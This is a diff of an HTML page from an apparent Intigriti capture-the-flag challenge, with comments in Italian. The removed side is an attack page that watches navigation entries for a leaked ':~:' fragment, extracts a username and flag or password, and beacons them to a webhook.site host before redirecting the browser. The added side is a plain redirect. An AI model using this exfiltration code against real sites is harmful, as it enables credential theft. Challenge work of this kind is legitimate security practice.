@@ -1,132 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Observer Page</title>
+    <title>Redirecting...</title>
+    <!-- Ritardo di 2-3 secondi, URL decodificato dal parametro 'target' -->
+    <meta http-equiv="refresh" content="3;url=https://challenge-0325.intigriti.io/note/d577d06c-c0d1-4ca2-9a25-abfe2d827202">
+    <script>
+        // Fallback o alternativa con JS
+        // setTimeout(() => { window.location.href = 'https://challenge-0325.intigriti.io/note/d577d06c-c0d1-4ca2-9a25-abfe2d827202'; }, 3000);
+    </script>
 </head>
 <body>
-    <p>Observer Active. Please wait...</p>
-
-    <script>
-        // --- CONFIGURAZIONE ---
-        const WEBHOOK = 'https://webhook.site/ec2c1762-e345-4cd3-b76a-7c8482efe72d'; // Il tuo webhook
-        // URL del challenge che attiva il middleware (usa un UUID fittizio ma valido nel formato)
-        const CHALLENGE_NOTE_URL = 'https://challenge-0325.intigriti.io/note/11111111-1111-1111-1111-111111111111';
-        // --------------------
-
-        let flagFound = false;
-
-        // Funzione per inviare dati al webhook
-        function send(params) {
-            if (!WEBHOOK || WEBHOOK === 'IL_TUO_WEBHOOK_URL') {
-                console.error("ERRORE: URL Webhook non configurato!");
-                return;
-            }
-            try {
-                // Tronca parametri lunghi per sicurezza
-                for (const key in params) {
-                    if (typeof params[key] === 'string' && params[key].length > 500) {
-                        params[key] = params[key].substring(0, 497) + '...';
-                    }
-                }
-                const queryString = Object.keys(params).map(key => key + '=' + encodeURIComponent(params[key])).join('&');
-                new Image().src = WEBHOOK + '?' + queryString;
-                console.log('Webhook Sent:', params);
-            } catch (e) {
-                console.error('Webhook Send Error:', e);
-                // Prova a inviare l'errore stesso
-                try {
-                    new Image().src = WEBHOOK + '?error=send_func_error&message=' + encodeURIComponent(e.message);
-                } catch (e2) { /* Ignora errore nell'invio dell'errore */ }
-            }
-        }
-
-        // Inizio script principale
-        try {
-            send({ status: 'observer_page_loaded', ts: Date.now() });
-
-            const observer = new PerformanceObserver((list) => {
-                if (flagFound) {
-                    console.log("Observer callback: Flag già trovata, ignoro.");
-                    return;
-                }
-                send({ status: 'observer_callback_entered', entry_count: list.getEntries().length });
-
-                list.getEntries().forEach((entry) => {
-                    if (flagFound) return;
-
-                    // Cerchiamo specificamente un evento di navigazione che contenga il fragment anomalo
-                    // Questo dovrebbe corrispondere al redirect fatto dal middleware del challenge
-                    if (entry.entryType === 'navigation' && entry.name && entry.name.includes(':~:')) {
-                        send({ status: 'nav_entry_potential_leak', url_preview: entry.name.substring(0, 150), ts: Date.now() });
-
-                        try {
-                            // Decodifica l'URL (potrebbe contenere % encoding)
-                            const decodedUrl = decodeURIComponent(entry.name);
-                            send({ status: 'decoded_url_attempt', decoded_preview: decodedUrl.substring(0, 150) });
-
-                            // Splitta per trovare la parte dopo :~:
-                            const fragmentParts = decodedUrl.split(':~:');
-                            if (fragmentParts.length > 1) {
-                                const leakData = fragmentParts[1];
-                                send({ status: 'fragment_part_found', data: leakData });
-
-                                // Splitta per : per separare username e password/flag
-                                const credentialParts = leakData.split(':');
-                                if (credentialParts.length > 1) {
-                                    // La flag è la seconda parte (o tutto ciò che segue il primo :)
-                                    const potentialFlag = credentialParts.slice(1).join(':');
-                                    send({
-                                        status: 'FLAG_CAPTURED',
-                                        flag_final_observer: potentialFlag,
-                                        source: 'perf_observer_nav_url_decoded_split',
-                                        full_fragment: leakData,
-                                        ts: Date.now()
-                                    });
-                                    flagFound = true;
-                                    observer.disconnect(); // Trovata! Stop osservazione.
-                                    console.log("FLAG TROVATA E INVIATA!", potentialFlag);
-                                } else {
-                                    send({ error: 'fragment_format_unexpected_no_colon', data: leakData, ts: Date.now() });
-                                    flagFound = true; // Interrompi comunque se il formato non è atteso
-                                    observer.disconnect();
-                                }
-                            } else {
-                                send({ error: 'split_by_separator_yielded_no_fragment', decoded_url: decodedUrl, ts: Date.now() });
-                                flagFound = true; // Interrompi
-                                observer.disconnect();
-                            }
-                        } catch (e) {
-                            send({ error: 'decode_split_error', message: e.message, url: entry.name, ts: Date.now() });
-                            flagFound = true; // Interrompi in caso di errore critico
-                            observer.disconnect();
-                        }
-                    } else {
-                        // Logga altre entry di navigazione per debug, se necessario
-                         // send({ status: 'other_nav_entry', type: entry.entryType, name_preview: entry.name ? entry.name.substring(0,100) : 'N/A' });
-                    }
-                });
-            });
-
-            // Inizia ad osservare gli eventi di navigazione
-            observer.observe({ type: 'navigate', buffered: true });
-            // Alternativa: observer.observe({ entryTypes: ['navigation'], buffered: true });
-            send({ status: 'observer_attached', ts: Date.now() });
-            console.log("PerformanceObserver attached.");
-
-            // --- IL REDIRECT CRUCIALE ---
-            // Ora che l'observer è attivo, reindirizza il browser alla pagina del challenge
-            // Questo farà scattare il middleware del challenge e il conseguente redirect con la flag.
-            console.log("Redirecting to challenge URL:", CHALLENGE_NOTE_URL);
-            send({ status: 'redirecting_to_challenge', url: CHALLENGE_NOTE_URL, ts: Date.now() });
-            window.location.href = CHALLENGE_NOTE_URL;
-
-        } catch (e) {
-            // Gestione errori generici dello script della pagina observer
-            console.error("Errore nello script della pagina observer:", e);
-            send({ error: 'observer_page_main_catch', message: e.message, ts: Date.now() });
-        }
-    </script>
-
+    <p>One moment...</p>
 </body>
 </html>
